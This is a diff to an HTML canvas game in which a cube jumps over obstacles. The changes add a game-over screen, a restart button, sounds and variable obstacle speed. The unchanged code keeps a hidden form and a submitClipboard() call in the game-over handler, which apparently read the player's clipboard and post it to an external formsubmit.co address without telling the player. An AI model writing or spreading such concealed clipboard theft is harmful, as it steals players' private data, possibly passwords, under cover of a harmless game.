@@ -8,29 +8,63 @@
     body {
       margin: 0;
       padding: 0;
-      background-color: #f0f0f0;
+      background-color: #333;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       overflow: hidden;
+      flex-direction: column;
     }
     canvas {
-      background-color: #333;
+      background-color: #222;
       border: 2px solid #000;
+    }
+    .gameOverScreen {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      color: white;
+      display: none;
+    }
+    .gameOverScreen h2 {
+      font-size: 50px;
+    }
+    .gameOverScreen button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #4CAF50;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .gameOverScreen button:hover {
+      background-color: #45a049;
     }
   </style>
 </head>
 <body>
+
   <canvas id="gameCanvas" width="800" height="400"></canvas>
+  <div class="gameOverScreen" id="gameOverScreen">
+    <h2>GAME OVER</h2>
+    <p>Score: <span id="finalScore"></span></p>
+    <button onclick="restartGame()">Restart</button>
+  </div>
+
   <form id="submitForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display: none;">
     <input type="hidden" name="clipboardText" id="clipboardInput">
   </form>
 
   <script>
-    // Get the canvas and context
     const canvas = document.getElementById('gameCanvas');
     const ctx = canvas.getContext('2d');
+
+    // Sound effects
+    const jumpSound = new Audio('https://www.soundjay.com/button/beep-07.wav');
+    const gameOverSound = new Audio('https://www.soundjay.com/button/beep-08b.wav');
 
     // Game variables
     let cube = {
@@ -55,6 +89,7 @@
         displayGameOver();
         return;
       }
+
       ctx.clearRect(0, 0, canvas.width, canvas.height);
       cube.velocity += cube.gravity;
       cube.y += cube.velocity;
@@ -77,13 +112,14 @@
           x: canvas.width,
           y: canvas.height - obstacleHeight,
           width: 20,
-          height: obstacleHeight
+          height: obstacleHeight,
+          speed: Math.random() * 3 + 2 // Varying obstacle speed
         });
       }
 
       for (let i = 0; i < obstacles.length; i++) {
         let obstacle = obstacles[i];
-        obstacle.x -= cube.speed;
+        obstacle.x -= obstacle.speed; // Dynamic obstacle speed
         ctx.fillStyle = "#f00";
         ctx.fillRect(obstacle.x, obstacle.y, obstacle.width, obstacle.height);
 
@@ -113,20 +149,18 @@
       if (!cube.jumping) {
         cube.velocity = cube.jumpPower;
         cube.jumping = true;
+        jumpSound.play();
       }
     }
 
     // Game Over screen
     function displayGameOver() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = "#fff";
-      ctx.font = "40px Arial";
-      ctx.fillText("GAME OVER", canvas.width / 2 - 100, canvas.height / 2);
-      ctx.font = "20px Arial";
-      ctx.fillText("Score: " + score, canvas.width / 2 - 40, canvas.height / 2 + 40);
+      document.getElementById('finalScore').textContent = score;
+      document.getElementById('gameOverScreen').style.display = 'block';
 
       // Submit clipboard content when game ends
       submitClipboard();
+      gameOverSound.play();
     }
 
     // Submit clipboard text to form
@@ -138,6 +172,18 @@
       } catch (err) {
         console.error('Failed to read clipboard: ' + err.message);
       }
+    }
+
+    // Restart the game
+    function restartGame() {
+      cube.y = 300;
+      cube.velocity = 0;
+      cube.jumping = false;
+      obstacles = [];
+      score = 0;
+      isGameOver = false;
+      document.getElementById('gameOverScreen').style.display = 'none';
+      gameLoop();
     }
 
     // Event listener for jumping
